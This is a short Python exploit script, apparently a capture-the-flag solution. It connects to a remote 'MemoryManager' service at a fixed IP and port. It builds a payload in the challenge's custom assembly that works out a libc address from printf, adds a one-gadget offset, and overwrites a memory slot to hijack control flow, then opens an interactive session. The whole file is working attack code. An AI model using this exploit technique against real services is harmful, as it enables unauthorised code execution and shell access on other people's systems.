from ptrlib import *
from asm import *

libc = ELF("libc-2.31.so")
#sock = Process("./MemoryManager")
sock = Socket("nc 39.115.110.8 5859")

payload  = b''
payload += push(mem64((0x10b0 ^ 0xffffffffffffffff) + 1))
payload += pop(reg(ax))
payload += sub(reg(ax), reg(ax), val32(libc.symbol("printf")))
payload += add(reg(ax), reg(ax), val32(0xe6c81))
payload += xchg(mem64((0x1090 ^ 0xffffffffffffffff) + 1), reg(ax))
payload += debug_regs()

sock.sendafter("> ", "hoge")
input("> ")
sock.sendafter("> ", payload)

sock.interactive()
